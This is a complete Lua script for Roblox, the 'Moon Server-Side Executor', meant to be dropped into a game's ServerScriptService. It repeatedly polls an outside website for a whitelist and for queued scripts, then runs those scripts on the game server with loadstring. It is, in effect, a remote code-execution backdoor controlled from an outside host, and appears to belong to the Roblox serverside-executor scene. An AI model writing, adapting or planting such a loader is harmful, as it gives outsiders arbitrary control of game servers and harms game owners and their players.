--[[
    Moon Server-Side Executor
    Put this script in your Roblox game (ServerScriptService)
    
    SETUP:
    1. Replace WEBHOOK_URL with your actual website URL
    2. Replace WEBHOOK_KEY with your webhook key from the Admin Panel > Webhooks
]]

-- CONFIGURATION (CHANGE THESE)
local WEBHOOK_URL = "YOUR_WEBSITE_URL" -- e.g., "https://your-site.vercel.app"
local WEBHOOK_KEY = "YOUR_WEBHOOK_KEY" -- Get this from Admin Panel > Webhooks

-- DO NOT EDIT BELOW THIS LINE
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WHITELIST_ENDPOINT = WEBHOOK_URL .. "/api/whitelist?webhookKey=" .. WEBHOOK_KEY
local EXECUTOR_ENDPOINT = WEBHOOK_URL .. "/api/executor"

-- Cache for whitelisted users
local whitelistedUsers = {}
local lastWhitelistFetch = 0
local WHITELIST_CACHE_TIME = 30 -- Refresh whitelist every 30 seconds

-- Fetch whitelisted users
local function fetchWhitelist()
    local success, result = pcall(function()
        local response = HttpService:GetAsync(WHITELIST_ENDPOINT)
        return HttpService:JSONDecode(response)
    end)
    
    if success and type(result) == "table" then
        whitelistedUsers = {}
        for _, username in ipairs(result) do
            whitelistedUsers[string.lower(username)] = true
        end
        print("[Moon] Whitelist updated: " .. #result .. " users")
    else
        warn("[Moon] Failed to fetch whitelist")
    end
    
    lastWhitelistFetch = tick()
end

-- Check if a player is whitelisted
local function isWhitelisted(player)
    local username = string.lower(player.Name)
    return whitelistedUsers[username] == true
end

-- Fetch and execute pending scripts for a player
local function fetchAndExecuteScripts(player)
    if not isWhitelisted(player) then return end
    
    local url = EXECUTOR_ENDPOINT .. "?webhookKey=" .. WEBHOOK_KEY .. "&robloxUser=" .. player.Name .. "&action=fetch"
    
    local success, result = pcall(function()
        local response = HttpService:GetAsync(url)
        return HttpService:JSONDecode(response)
    end)
    
    if success and result and result.scripts then
        for _, script in ipairs(result.scripts) do
            -- Execute the script
            local execSuccess, execError = pcall(function()
                loadstring(script)()
            end)
            
            if execSuccess then
                print("[Moon] Executed script for " .. player.Name)
            else
                warn("[Moon] Script error for " .. player.Name .. ": " .. tostring(execError))
            end
        end
    end
end

-- Main loop
spawn(function()
    while true do
        -- Refresh whitelist if needed
        if tick() - lastWhitelistFetch > WHITELIST_CACHE_TIME then
            fetchWhitelist()
        end
        
        -- Check for pending scripts for all whitelisted players
        for _, player in ipairs(Players:GetPlayers()) do
            if isWhitelisted(player) then
                fetchAndExecuteScripts(player)
            end
        end
        
        wait(5) -- Check every 5 seconds
    end
end)

-- Initial whitelist fetch
fetchWhitelist()

-- Handle new players
Players.PlayerAdded:Connect(function(player)
    -- Refresh whitelist when a new player joins
    if tick() - lastWhitelistFetch > 5 then
        fetchWhitelist()
    end
end)

print("[Moon] Server-Side Executor loaded!")
